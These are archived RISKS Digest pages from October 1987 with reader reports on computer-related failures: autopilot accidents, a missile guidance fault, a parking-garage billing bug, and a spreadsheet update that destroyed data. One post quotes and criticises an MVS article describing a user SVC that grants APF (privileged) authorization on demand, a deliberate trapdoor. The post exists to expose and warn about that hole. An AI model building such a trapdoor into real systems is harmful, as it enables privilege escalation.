The following paragraph is taken (without permission) from p. 14 of the
November 2 "Business Week". I thought it was an amusing little bug report.
I tried to imagine how it could happen... you'd think we'd have alphabetical
order down pat by now!

	Some copies of our special bonus issue,
	The Corporate Elite: Chief Executives of
	the Business Week Top 1000, contain
	mistakes in the alphabetical index of
	chief executives on pages 341-350 and in
	the guide to how to read the CEO profiles
	on page 350. Because of a computer problem,
	certain letter combinations with "f" were
	omitted from company names and the guide.

jerry ryan (allegra!cord!gwr)  Bell Labs, Liberty Corner NJ

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Television series "Welcome to my world"
</A>
</H3>
<address>
Clive Feather 
&lt;<A HREF="mailto:mcvax!root.co.uk!cdwf@uunet.UU.NET">
mcvax!root.co.uk!cdwf@uunet.UU.NET
</A>&gt;
</address>
<i>

</i><PRE>
Date: 27 Oct 87 13:25:43 GMT
Organization: Root Computers Ltd, London, England

There is a new series on BBC1 television called "Welcome to my World"
which raises some of the topics we are / ought to be discussing. Anyone
out there seen it and got any comments ?

It's on BBC1, Sundays, at 2305 until 2335.

Clive D.W. Feather     +44 1 606 7799 x 235

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-3</DOCNO>
<DOCOLDNO>IA012-000130-B021-249</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.51.html 128.240.150.127 19970217013923 text/html 14021
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:37:45 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 51</TITLE>
<LINK REL="Prev" HREF="/Risks/5.50.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.52.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 51</H1>
<H2> Wednesday, 28 October 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Reported Japanese Autopilot Problems 
</A>
<DD>
<A HREF="#subj1.1">
Will Martin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  (Non-)Japanese Autopilot Problems 
</A>
<DD>
<A HREF="#subj2.1">
Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Possible nuclear launch prevented by parked vehicle 
</A>
<DD>
<A HREF="#subj3.1">
Scot Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  SDI information system announced 
</A>
<DD>
<A HREF="#subj4.1">
Scot Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  'Computers In Battle' 
</A>
<DD>
<A HREF="#subj5.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Amusing bug: Business Week Computer (F)ails 
</A>
<DD>
<A HREF="#subj6.1">
John Pershing
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Civil Disobedience 
</A>
<DD>
<A HREF="#subj7.1">
Fred Baube
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Re: Reported Japanese Autopilot Problems
</A>
</H3>
<address>
Will Martin -- AMXAL-RI 
&lt;<A HREF="mailto:wmartin@ALMSA-1.ARPA">
wmartin@ALMSA-1.ARPA
</A>&gt;
</address>
<i>
Wed, 28 Oct 87 10:56:58 CST
</i><PRE>

Yes, I heard that report, and watched most of it (I was in the kitchen
at the time and it was on the tiny-screen set on top of the fridge,
and I was doing other things at the same time, but I caught the gist).

The particular plane is a corporate turboprop, and there have been
repeated instances of crashes at high speed into the ground. Recordings
of pilot-to-tower conversations indicate that the autopilot has had a
history of seizing control away from the human pilot, and that turning
it off again is sometimes difficult or impossible. (There weren't many
details; I am guessing that to disable it the pilot has to hit circuit
breakers or otherwise power down the autopilot, and it may be hard to do
when he is also wrestling with the controls to try to keep the plane
from crashing.) Could it be that, this being a corporate plane, there is
normally only a single pilot, not a pair (pilot &amp; copilot), so there are
no free hands to fiddle about with such switches or seldom-used
controls? (That's just an unsupported speculation on my part...)

In any case, it was a for-real broadcast. You might be able to get a
transcript from CBS or from one of the video-news-recording/clipping
services. (Side note to the list: Does anyone have a comprehensive list
of such video-clipping services? I've heard of them several times, and
it seems that people often need to get such info, like in this case,
after hearing about a televised report or event that they missed. I
don't know any specific firm or organization names or locations, nor
have I any idea of what such services cost.)

Regards, Will Martin

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
(Non-)Japanese Autopilot Problems
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 28 Oct 87 12:43:39 EST
From: Joe Morris (jcmorris@mitre.arpa) &lt;jcmorris@mitre.arpa&gt;

In RISKS 5:50, Nancy Leveson writes:

&gt;  Supposedly, the [Japanese MU-2's] computerized autopilot will, under 
&gt;  certain conditions, not let the pilot have control back.

I think you'll find that most autopilots -- indeed, most avionics of any
type -- in American-registered aircraft will be American-manufactured.  At
least at the low and middle end (I can't speak for the high-priced spread
types) there isn't much penetration by foreign manufacturers.  While I've
never flown the MU-2, my memory says that those I've seen had either King,
Bendix, or Sperry avionics packages, probably with a matching IFCS
(Integrated Flight Control System).

I recall seeing some MU-2 accident reports a while back that referred to the
autopilot as being involved, including one in which the pilot told the
FAA controller that he had autopilot problems just before the (fatal) crash.
I'm inclined to doubt that "the autopilot would not let the pilot have
control back", since the control servo drives the (mechanical) control wire
through a slip clutch whose breakaway limit must be no greater than can
be overcome by the pilot.  It would require a runaway autopilot *and* a
siezed clutch to deny the pilot control.

The MU-2 has a reputation of requiring an unusually high degree of attention
by the pilot, so any autopilot problems could be more serious in a MU-2 than
the same problem would be in, say, a Cessna 421.

What may be more likely is that the autopilot sets up divergent oscillation
which ultimately overstresses the airframe.  If for some reason the pilot
fails to disconnect the autopilot promptly, the result can be spacial 
disorientation which in turn can cause the pilot to lose control of the
aircraft even if the autopilot-induced load was within limits.

What does this mean to RISKS-readers?  One problem which is found in many
aviation accident reports is that the aircrew (student pilot through 747
captain) has become complacent due to the assistance given by the "black
boxes" on the aircraft.  When one of those boxes fails, the sudden transition
to basic flying and navigation (probably not practiced for a l-o-n-g time)
isn't successful and the airplane does things it's not supposed to.  Even
worse, the boxes can give false or conflicting data and the aircrew doesn't
resolve the problem in time to prevent an accident, like a 727 did a few
years ago in New York when its stall warning (in effect, underspeed...no
flames, please) and Mach warning (overspeed) alarms both activated.  The result
was a "superstall" and crash with no survivers...straight down from 30,000 feet.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Possible nuclear launch prevented by parked vehicle
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 28 Oct 87 12:23:56 CST (Wed)
From: umn-cs!sewilco@datapg.MN.ORG (Scot Wilcoxon)
To: risks@csl.sri.com

Nearly three years ago a malfunctioning guidance system caused indication
of a launch sequence on a Minuteman 3 missile with three nuclear warheads.
An armored vehicle was then parked on the silo to block any accidental
launch.

AP reported that a Wednesday story in the Casper Star Tribune says the
guidance system malfunctioned on January 10, 1984.  Capt. Bill Kalton of
Warren Air Force base says that lights which monitor the status of the
missile followed the pattern of a launch.  When the guidance system
failed it showed false indications on the monitoring equipment.

A response team rushed to the missile site, parked an armored vehicle on
top of the silo and left the scene.  If the concrete cover of the silo
had opened the vehicle would have fallen on the missile, damaging it and
blocking its path.  A maintenance team determined the missile was not in
a launch sequence and that the warheads were not armed.

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	{ems,meccts}!datapg!sewilco
Data Progress		Minneapolis, MN, USA	+1 612-825-2607

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
SDI information system announced
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 28 Oct 87 12:23:33 CST (Wed)
From: umn-cs!sewilco@datapg.MN.ORG (Scot Wilcoxon)
To: risks@csl.sri.com

AP reports that the Pentagon has created a computer-based system to
encourage communication of SDI technology.  Col. Jim Ball, director of
technology applications for the SDI Organization, made the announcement.
Using TAIS, "a civilian researcher working on a field also being explored
for Star Wars can obtain an unclassified summary of the Star Wars work
and a referral to the individual researcher for consultation."

The TAIS computer will not have classified information and will be
available at only the cost of a phone call.  U.S. citizens, after
agreeing not to disclose sensitive information, can apply to the Defense
Logistics agency for an access code.  No security clearance is needed,
although the Pentagon considers some information as being sensitive
enough to keep track of those who have access.

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	{ems,meccts}!datapg!sewilco
Data Progress		Minneapolis, MN, USA	+1 612-825-2607

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
'Computers In Battle'
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
28 Oct 87 07:25:03 PST (Wednesday)
</i><PRE>
To: RISKS@csl.sri.com
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

A brand new book of interest:

'Computers In Battle' edited by David Bellin and Gary Chapman.
Harcourt Brace Jovanovich, 1987, $14.95.
xiv + 362 pages, including Bibliography, Resources, Index.
ISBN 0-15-121232-5

       Table of Contents

Computers in Battle:  A Human Overview
   Severo Ornstein

A History of Computers and Weapons Systems
   Paul N. Edwards

The New Generation of High-Technology Weapons
   Gary Chapman

Computer System Reliability and Nuclear War
   Alan Borning

Computer and the Strategic Defense Initiative
   Eric Roberts and Steve Berlin

The Strategic Computing Program
   Jonathan Jacky

Computers in Weapons:  The Limits of Confidence
   David Lorge Parnas

Artificial Intelligence as Military Technology
   Tom Athanasiou

High Technology and the Emerging Dual Economy
   Lenny Siegel and John Markoff

The Role of Military Funding in Academic Computer Science
   Clark Thomborson

Computers and War:  Philosophical Reflections on Ends and Means
   John Ladd

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Amusing bug: Business Week Computer (F)ails
</A>
</H3>
<address>
John Pershing 
&lt;<A HREF="mailto:PERSHNG@ibm.com">
PERSHNG@ibm.com
</A>&gt;
</address>
<i>
28 October 1987, 09:44:47 EST
</i><PRE>

Just an educated guess, but the failure was probably due to the index
generation software not recognizing ligatures (e.g., 'fl' and 'ffl'),
which were stored as single, "non-alphabetic" characters.

      John A. Pershing Jr.,       Yorktown Heights

         [Ligature software carefully before using it.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Civil Disobedience
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 28 Oct 87 10:38:58 -0500
From: Fred Baube &lt;fbaube@note.nsf.gov&gt;

An important element of civil disobedience is that you take
your lumps as they are determined by the system whose legi-
timacy you are challenging.  Thus the blacks who sat in the
front of the buses and accepted arrest were practicing civil
disobedience, in the hope that the visibility would create
the public sentiment for change.

In a republic such as ours, CD provides an important avenue
of political expression, when the "approved" methods (writing
legislators, organizing, bumperstickers) don't cut the mustard.

   [OK...  I think we have saturated on this one for now.  TNX...  PGN.]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-4</DOCNO>
<DOCOLDNO>IA012-000130-B021-269</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.52.html 128.240.150.127 19970217013940 text/html 30193
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:38:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 52</TITLE>
<LINK REL="Prev" HREF="/Risks/5.51.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.53.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.51.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.53.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 52</H1>
<H2> Saturday, 31 October 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks in intelligent security algorithms 
</A>
<DD>
<A HREF="#subj1.1">
Peter J. Denning
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer's Normal Operation Delays Royal Visit 
</A>
<DD>
<A HREF="#subj2.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Public notice of a security leak 
</A>
<DD>
<A HREF="#subj3.1">
Rob van Hoboken based on Nils Plum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  sc.4.1 update dangerous 
</A>
<DD>
<A HREF="#subj4.1">
Fen Labalme
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Mitsubishi MU-2 problems 
</A>
<DD>
<A HREF="#subj5.1">
Peter Ladkin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Autopilots and conflicting alarms 
</A>
<DD>
<A HREF="#subj6.1">
Matt Jaffe
</A><br>
<A HREF="#subj6.2">
 Joe Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  New encryption method 
</A>
<DD>
<A HREF="#subj7.1">
Stevan Milunovic
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  The Stock Market and Program Trading 
</A>
<DD>
<A HREF="#subj8.1">
Dan Blumenthal
</A><br>
<A HREF="#subj8.2">
 Brent Laminack
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Minuteman Missiles... 
</A>
<DD>
<A HREF="#subj9.1">
John J. McMahon
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks in intelligent security algorithms
</A>
</H3>
<address>
Peter J. Denning 
&lt;<A HREF="mailto:pjd@riacs.edu">
pjd@riacs.edu
</A>&gt;
</address>
<i>
Fri, 30 Oct 87 13:25:45 pst
</i><PRE>

On October 29 I was ensnared by a design flaw in the security system of the
parking garage of the San Francisco airport.  The same system is undoubtedly
used at other airports.  I had returned from a trip that morning and paid
$88 for 8 days.  I returned the same evening to fetch my wife, who returned
from a trip.  On presenting my ticket, the attendant said the computer said
I owed $99, rather than the $1 I was expecting to pay.  Guards appeared and
instructed us to go to the garage office to discuss the matter with garage
officials.  After some discussion the garage official allowed us to leave,
paying $1.

Here's what happened.  The garage security system is set up to prevent a
customer from obtaining a second entry ticket on his return and thereby
underpaying.  When I entered the garage 8 days ago, a video camera recorded
my license number and associated it the parking ticket dispensed by the
machine; the resulting license-ticket entry record was placed in a database
later that night.  When I checked out, an exit record of my license-ticket
pair was made, and scheduled to cancel the entry record during the late
night computer run.  However, when I attempted to check out the second time,
I had not been there long enough for a new license-ticket entry record to be
placed in the database; accordingly the standard database check found the
still unpurged record of my first entry and computed that I owed for 9 days.

The garage official apologized for the inconvenience and said the system is
needed to prevent fraud and occasionally someone stumbles into a false
alarm.  There is no interest in changing the system or posting notices
warning customers to keep their receipts if they return to the garage a
second time in one day.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer's Normal Operation Delays Royal Visit
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Thu, 29 Oct 87 14:18:17 EST
</i><PRE>

  From an article in MODERN RAILWAYS, September 1987, by Roger Ford,
  on the opening of the Docklands Light Railway (DLR) in London.
  Submitted to RISKS (and slightly edited) by Mark Brader:

Ironically, the 'problems' the daily press reported at the Royal Opening
were caused by the automatic system working properly.  The royal train
(number E2R -- a nice touch that) was timetabled to leave Island Gardens
station at 15:30.  As the royal party was early, the control room dispatched
the train manually rather than keep Her Majesty waiting for five minutes.

This meant overriding the computer, which was operating in regulated
mode.  Unfortunately, computers are less sensitive to royal protocol,
and when E2R arrived at Mud Chute station [!] five minutes early, it was given
a "dwell time" of several minutes to bring it in line with the timetable.

If you happen to be on board a stationary train with your Sovereign,
two minutes is a very long time, so the train captain reverted to manual ...

One of the golden rules for bodyguards is that you leave a vehicle or
building first.  As the train rolled to a halt in Poplar station,
a security man used the emergency exit so he could get out first.
Not only did this stop the train by interrupting the door-safety
interlock circuit, it stopped it short of the docking beacon.
Unless the train receives a message from the beacon it does not know
it is in a station and the doors won't open.

I was standing next to the manager of the doorgear suppliers at the time
and can vouch for the fact that time also stretches agonisingly when
there is the possibility that Her Majesty is being isolated from her loyal
subjects in Docklands by your product!

In the light of this, I wonder whether anyone has thought to give the
police and counter-terrorist organisations a briefing on the features
of automatic railway operation.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Public notice of a security leak
</A>
</H3>
<address>
&lt;<A HREF="mailto:RCOPROB%HDETUD1.BITNET@wiscvm.wisc.edu">
RCOPROB%HDETUD1.BITNET@wiscvm.wisc.edu
</A>&gt;
</address>
<i>
Wed, 28 Oct 87 21:18:02 MET
</i><PRE>

From: Rob van Hoboken           +31 15 78-3813       RCOPROB  at HDETUD1

I found the following gem in issue 10 (July 1987) of MVS update, a publication
of Xephon aimed at the MVS systems programmer.

&gt; Dynamically making programs APF authorized
&gt;
&gt; The following procedure should work under any release of MVS.
&gt;
&gt; The standard way of making progrmas APF authorised is to link them into an
&gt; authorised library specified in the SYS1.PARMLIB member IEAAPFnn with the
&gt; link-edit attibute of AC=1.  Changes to such a library specification will
&gt; require a re-IPL.
&gt; If authorised programs are to be executed under TSO, they must be put into
&gt; a table in the Link Pack Area: TSO commands go into table IKJEFTE2 and called
&gt; programs go into IKJEFTE8.  Any changes to these tables require a re-IPL
&gt; with the CLP option to make them effective.
&gt; It is, therefore, convenient to be able to turn on and off the APF
&gt; authorisation dynamically for any program that does not have the AC=1
&gt; attribute, in any library upon request.
&gt; Just be aware that this can be a security exposure.
&gt; The solution:
&gt; The method is to have a user SVC that sets or removes the APF bit in the
&gt; control block JSCB.  This SVC is probably well known but it is, together
&gt; with the following two macros, a pre-requisite to many homegrown functions
&gt; that help to make life easier.
&gt; The following SVC can be enhanced by adding installation dependent security
&gt; checks:
&gt; * authorisation svc 235 type 4
&gt; *   r0 = 1 turns on auth
&gt; *   r0 ne 1 turns off auth
&gt; *
&gt;    code follows

Personally I would rather omit the name of the author to protect the guilty
(but most of all his company), but since there was a copyright statement on
the publication:
(C) Nils Plum, Systems Programmer (Denmark).

In effect this persons describes a hole in his installation, and proudly
tells us that many of his tools depend on it.  Probably (I've seen it in
several installations) the "installation dependent security checks" were
removed at some time to make "all those goodies available to us users".

The worst part is that a lot of software companies ship out programs that
actually need these kind of trapdoors to function at all.  I have written
to some of these companies with a description of the problem, proof of its
existence and a work around.  I got laughed at, made rediculous and told
to not to spread the word.  One of these people (a real big company!!!) even
told me: (direct quote!)
"it must be safe, even the CIA uses it"

Can anyone help me to a userid + phone number on either Mr. Plum's installation
or the CIA?

Rob van Hoboken, Delft University of Technology, Computing Center

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
sc.4.1 update dangerous
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 29 Oct 87 12:25:42 PST (Thu)
From: Fen Labalme &lt;sun!megatest!elvis.fen@ucbvax.Berkeley.EDU&gt;

The new release (4.1) to the public domain spreadsheet "sc" has a
noncompatible change that, along with an overlapping windows Sun environment
and an ambiguous (but fairly standard) naming convention, conspired to
destroy a database.

I maintain a database of members of a Spring Water Cooperative at my
workplace in North San Jose.  Each member contributes $3 a month to enjoy
unlimited use of a bottled water cooler.  The record of accounts is kept in
a database maintained by sc.

The entry for a member for any particular month (say, [K1]) is the minimum
of the total_amount_contributed [A7] minus the sum of payments so far
[@sum(d7:J7)] and the current ammount due [K0].  As a sc.3.1 expression,
[@min(A7-@sum(D7:J7),K0)].

This morning our /usr/local manager installed sc.4.1 naming it
/usr/local/bin/sc (simply replacing its predecessor).

Soon after, a member gave me his dues for the month.  I opened sc in a
window that had its right half hidden by an overlapping window, yet I had
access to the total_amount_contributed column.  Thus I did not notice that
the right half of the spreadsheet was blank! I updated his account and saved
the database.

What I didn't realize is that sc.4.1 didn't recognize this usage of @min(),
as this had changed, and when it saved the database, it simply and quietly
ignored (read: deleted) all of the entries which it didn't "understand".

Thank Zippy for disk-to-paper dumps!
         					-fen

P.S. I am sorry to see this useful function disappear.  The README states
that the "range" function should be used in its stead, but I havn't yet
figured out how.  Old and new expressions for table entries appear below:

	old:   @min(A7-@sum(D7:J7),K0)
	new:   A7-@sum(D7:J7)&lt;K0?A7-@sum(D7:J7):K0

Fen Labalme, Megatest Corp, VLSI Systems Division, 880 Fox Lane, San Jose,
CA 95131  (408) 437-9700 x3382
                "megatest!fen"@riacs.ARPA   UUCP: ucbvax!sun!megatest!fen

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Mitsubishi MU-2 problems
</A>
</H3>
<address>
Peter Ladkin
&lt;<A HREF="mailto:ladkin@kestrel.ARPA ">
ladkin@kestrel.ARPA 
</A>&gt;
</address>
<i>
Fri, 30 Oct 87 11:07:59 PDT
</i><PRE>

if anyone would like detailed knowledge of the mu-2 accident rate,
i can look up some analyses i have. please send me mail.

roughly, there have been a number of unexplained `uncontrolled descents
into terrain' with the mu-2. of the order of a dozen, mostly with
experienced pilots, although not with a lot of mu-2 experience.
some others that have been explained concern the proper operation of
the autopilot. autopilots with altitude hold can enter an unstable
feedback loop. e.g. the plane is trimmed to hold altitude, and deviates,
say down. the pilot pulls up, whereupon the autopilot senses control
pressure and commands down to counteract the pull-up. the pilot pulls
harder, exacerbating the problem. the mu-2 is a very clean aircraft 
and can exceed `never-exceed' speed very fast in a dive from cruise
speed. faster than about 115 per cent of this speed, and the aircraft
starts to break. speculation is that the pilots don't figure out the
problem before they reach these critical speeds. other speculation is
that there is a failure mode of runaway nose-down trim caused by the
autopilot. even other speculation is that control of the aircraft is 
coming up against human-factors issues that were (and still are)
poorly understood. it's clear that many of the accidents are
pilot-induced, as with many very-high-performance planes. 

peter ladkin, ladkin@kestrel.arpa

   [Late word from Nancy Leveson suggests that the equipment in question is
   analog rather than digital, but that is still quite computer related... PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Autopilots and conflicting alarms
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Thu, 29 Oct 87 12:11:11 -0800
From: Matt Jaffe &lt;jaffe@commerce.UCI.EDU&gt;

In RISKS 5:51, Joe Morris commented on conflicting alarms in a 727 accident.
My aero engineering days are a few years back, but I seem to recall that a
stall warning caused by high angle of attack (which translates to a function
of [low] indicated airspeed and dynamic load, the product of weight and
G-loading, assumed to be close to 1 for an airliner in cruise condition) and
overspeed warning caused by Mach number limitations (it is the Mach buffet
that is the problem at that point, not the dynamic pressure) occur together
at that point in the flight regime so aptly named the "coffin corner".  That
point, unfortunately, is also the point of maximum specific range, is it
not? (Which is why all airlines always try to fly as close to it as possible.)

Several points seem worth noting:
  (1)  Airline flight crews know about the coffin corner, they fly close 
       to it all the time, do they not?  The presence of the two
       alarms should not be considered as contradictory; they are
       both correct and indicate an unambiguous situation for which recovery
       procedures are (or should be) well known.

  (2)  As to whether the two-alarm condition is confusing, the presence of 
       two alarms that must be interpreted by the human operators 
       (as opposed to a single, "coffin corner" alarm) is a function of 
       the use of analog-mechanical alarm systems.
       The stall warning system operates (I presume) off of angle of attack;
       the overspeed warning off of Mach number (pitot differential and
       temperature). Neither system is connected to the other, the design 
       would be cumbersome, expensive, and risk-inducing.  Interpretation 
       of the two-alarm condition is properly (for the analog-mechanical 
       case) left to the human being. The introduction of digital,
       autopilots offers a chance to improve the situation somewhat.
       Instead of merely duplicating the set of alarms provided by the
       older technology devices, good digital system design would add the logic
